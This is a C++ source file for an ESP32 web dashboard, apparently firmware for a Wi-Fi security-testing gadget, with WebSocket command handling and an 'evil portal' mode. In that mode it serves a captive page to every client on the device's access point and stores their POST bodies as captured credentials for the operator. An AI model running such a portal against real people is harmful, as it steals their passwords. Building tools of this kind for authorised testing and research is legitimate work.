#include "web_dashboard.h"

#include <AsyncTCP.h>
#include <ESPAsyncWebServer.h>
#include <LittleFS.h>
#include <WiFi.h>

#include <array>
#include <atomic>
#include <map>
#include <mutex>
#include <string>
#include <string_view>

#include "action_catalog.h"
#include "core/usb_network.h"
#include "ws_command.h"

namespace webDashboard {

namespace {

constexpr size_t kMaxCommandBytes = 512;

AsyncWebServer server(80);
AsyncWebSocket ws("/ws");

// Guards queue_ and liveSessions_ only. Never held across parse, serialize, or
// a socket send (AsyncWebSocket::text takes its own client lock).
std::mutex stateMutex;
CommandQueue queue_;
std::map<uint32_t, uint64_t> liveSessions_;
uint64_t nextSessionToken = 1;

// --- Evil portal (disruptive; PLAN §2.4) ----------------------------------
// A handler registered before serveStatic(): when the portal is enabled it
// answers every GET/HEAD with the captive page and captures POST bodies as
// credential attempts. When disabled, canHandle() returns false so the normal
// dashboard handlers keep serving.
constexpr size_t kPortalMaxBodyBytes = 512;
constexpr size_t kPortalQueueCapacity = 8;

struct PortalCapture {
    std::string body;
    uint32_t sequence = 0;
};

std::mutex portalMutex; // guards portalPage/portalBodies/portalQueue
std::string portalPage;
std::atomic<bool> portalOn{false};
std::map<const void *, std::string> portalBodies; // request -> accumulated body
std::array<PortalCapture, kPortalQueueCapacity> portalQueue;
uint32_t portalQueueHead = 0;
uint32_t portalQueueSize = 0;
uint32_t portalCaptures = 0;

bool portalActiveNow() { return portalOn.load(std::memory_order_acquire); }

std::string portalPageCopy() {
    std::lock_guard<std::mutex> lock(portalMutex);
    return portalPage;
}

// The portal captures only traffic that really arrived on the management AP.
// Requests over the USB dashboard (its own netif/address) keep reaching the
// real dashboard, so the operator can still Stop the attack over USB while the
// portal shadows AP clients.
bool onApInterface(AsyncWebServerRequest *request) {
    AsyncClient *socket = request->client();
    if (!socket) return false;
    const IPAddress ap = WiFi.softAPIP();
    if (ap == IPAddress(0, 0, 0, 0)) return false; // AP not up: nothing to shadow
    return socket->localIP() == ap;
}

class PortalHandler : public AsyncWebHandler {
  public:
    bool canHandle(AsyncWebServerRequest *request) const override {
        if (!portalActiveNow() || !onApInterface(request)) return false;
        const WebRequestMethodComposite method = request->method();
        return method == HTTP_GET || method == HTTP_POST || method == HTTP_HEAD;
    }
    // Non-trivial so the server parses the body and calls handleBody().
    bool isRequestHandlerTrivial() const override { return false; }

    void handleBody(AsyncWebServerRequest *request, uint8_t *data, size_t len, size_t index, size_t total) override {
        (void)index;
        (void)total;
        std::lock_guard<std::mutex> lock(portalMutex);
        if (portalBodies.size() > kPortalQueueCapacity) portalBodies.clear(); // bounded
        std::string &body = portalBodies[request];
        if (body.size() + len > kPortalMaxBodyBytes) {
            body.clear(); // oversized attempt: drop instead of growing unbounded
            return;
        }
        body.append(reinterpret_cast<const char *>(data), len);
    }

    void handleRequest(AsyncWebServerRequest *request) override {
        std::string body;
        {
            std::lock_guard<std::mutex> lock(portalMutex);
            const auto it = portalBodies.find(request);
            if (it != portalBodies.end()) {
                body = std::move(it->second);
                portalBodies.erase(it);
            }
        }
        if (request->method() == HTTP_POST && !body.empty()) {
            std::lock_guard<std::mutex> lock(portalMutex);
            PortalCapture &slot = portalQueue[portalQueueHead];
            slot.body = std::move(body);
            slot.sequence = ++portalCaptures;
            portalQueueHead = (portalQueueHead + 1) % kPortalQueueCapacity;
            if (portalQueueSize < kPortalQueueCapacity) ++portalQueueSize;
        }
        request->send(200, "text/html", portalPageCopy().c_str());
    }
};

PortalHandler portalHandler;

void sendResult(uint32_t clientId, const std::string &json) { ws.text(clientId, json.c_str(), json.size()); }

void replyInvalid(AsyncWebSocketClient *client) {
    sendResult(client->id(), commandResultToJson(0, ModuleId::Unknown, CommandError::InvalidCommand));
}

void handleData(AsyncWebSocketClient *client, void *arg, uint8_t *data, size_t len) {
    auto *info = static_cast<AwsFrameInfo *>(arg);
    if (!info->final || info->index != 0 || info->len != len || info->opcode != WS_TEXT || len > kMaxCommandBytes) {
        replyInvalid(client);
        return;
    }

    const std::string_view view(reinterpret_cast<const char *>(data), len);
    const WsCommand command = parseWsCommand(view);

    if (!command.correlationValid) {
        replyInvalid(client);
        return;
    }
    if (command.error != CommandError::None) {
        sendResult(client->id(), commandResultToJson(command.id, command.module, command.error));
        return;
    }

    EnqueuedCommand request;
    request.clientId = client->id();
    request.command = command;
    {
        std::lock_guard<std::mutex> lock(stateMutex);
        const auto it = liveSessions_.find(client->id());
        if (it != liveSessions_.end()) request.sessionToken = it->second;
    }

    CommandError admitted;
    {
        std::lock_guard<std::mutex> lock(stateMutex);
        admitted = queue_.push(request);
    }
    if (admitted != CommandError::None) {
        sendResult(client->id(), commandResultToJson(command.id, command.module, admitted));
    }
}

void onWsEvent(AsyncWebSocket *, AsyncWebSocketClient *client, AwsEventType type, void *arg, uint8_t *data, size_t len) {
    switch (type) {
    case WS_EVT_CONNECT: {
        {
            std::lock_guard<std::mutex> lock(stateMutex);
            liveSessions_[client->id()] = nextSessionToken++;
        }
        // Send the action catalog so the dashboard can render its selectable
        // action list. Built outside the lock; never hold stateMutex across a send.
        const std::string catalog = catalogToJson();
        ws.text(client->id(), catalog.c_str(), catalog.size());

        // Tell this client which transport carried the WebSocket, from its own
        // local address (not the global USB state): a browser on the AP must not
        // be told the USB link keeps it reachable. Built by hand — the address is
        // a plain dotted IP, no JSON escaping needed.
        std::string clientIp = "0.0.0.0";
        if (AsyncClient *socket = client->client()) clientIp = socket->localIP().toString().c_str();
        const char *usbAddress = usbNetwork::address();
        const bool usb = usbAddress != nullptr && *usbAddress != '\0' && clientIp == usbAddress;
        std::string transport = "{\"type\":\"transport_info\",\"transport\":\"";
        transport += usb ? "usb" : "ap";
        transport += "\",\"address\":\"";
        transport += clientIp;
        transport += "\"}";
        ws.text(client->id(), transport.c_str(), transport.size());
        break;
    }
    case WS_EVT_DISCONNECT: {
        std::lock_guard<std::mutex> lock(stateMutex);
        liveSessions_.erase(client->id());
        break;
    }
    case WS_EVT_DATA:
        handleData(client, arg, data, len);
        break;
    default:
        break;
    }
}

} // namespace

void begin() {
    ws.onEvent(onWsEvent);
    server.addHandler(&ws);
    // Registered before serveStatic so the evil portal (when enabled) shadows
    // the dashboard pages; canHandle() is false while it is disabled.
    server.addHandler(&portalHandler);

    // Guard: /config.json holds the AP password and lives at the LittleFS root,
    // which the catch-all serveStatic below would otherwise expose to anyone on
    // the AP. Registered first so it wins over the static handler. Covers GET and
    // HEAD; matched case-sensitively, which is enough because LittleFS lookups
    // are themselves case-sensitive (a differing-case path 404s in serveStatic).
    server.on("/config.json", HTTP_ANY, [](AsyncWebServerRequest *request) { request->send(404); });

    server.serveStatic("/", LittleFS, "/").setDefaultFile("index.html");
    server.begin();
}

bool nextCommand(EnqueuedCommand &request) {
    std::lock_guard<std::mutex> lock(stateMutex);
    return queue_.pop(request);
}

void reply(const EnqueuedCommand &request, CommandError error) {
    bool live = false;
    {
        std::lock_guard<std::mutex> lock(stateMutex);
        const auto it = liveSessions_.find(request.clientId);
        live = it != liveSessions_.end() && it->second == request.sessionToken;
    }
    if (!live) return; // client left or a different session reused the id
    sendResult(request.clientId, commandResultToJson(request.command.id, request.command.module, error));
}

void publishStatus(const ModuleStatus &status) {
    const std::string payload = statusToJson(status);
    ws.textAll(payload.c_str(), payload.size());
}

void publishActionOutput(const ActionOutput &output) {
    const std::string payload = actionOutputToJson(output);
    if (payload.empty()) return; // malformed payload: never broadcast invalid JSON
    ws.textAll(payload.c_str(), payload.size());
}

void publishFrame(const std::string &json) { ws.textAll(json.c_str(), json.size()); }

void enableEvilPortal(const std::string &page) {
    std::lock_guard<std::mutex> lock(portalMutex);
    portalPage = page;
    portalBodies.clear();
    portalQueueHead = 0;
    portalQueueSize = 0;
    portalOn.store(true, std::memory_order_release);
}

void disableEvilPortal() {
    portalOn.store(false, std::memory_order_release);
    std::lock_guard<std::mutex> lock(portalMutex);
    portalBodies.clear();
}

bool takePortalCapture(std::string &body, uint32_t &sequence) {
    std::lock_guard<std::mutex> lock(portalMutex);
    if (portalQueueSize == 0) return false;
    const uint32_t tail = (portalQueueHead + kPortalQueueCapacity - portalQueueSize) % kPortalQueueCapacity;
    PortalCapture &slot = portalQueue[tail];
    body = std::move(slot.body);
    sequence = slot.sequence;
    slot.body.clear();
    --portalQueueSize;
    return true;
}

uint32_t portalCaptureCount() {
    std::lock_guard<std::mutex> lock(portalMutex);
    return portalCaptures;
}

void loop() { ws.cleanupClients(); }

} // namespace webDashboard
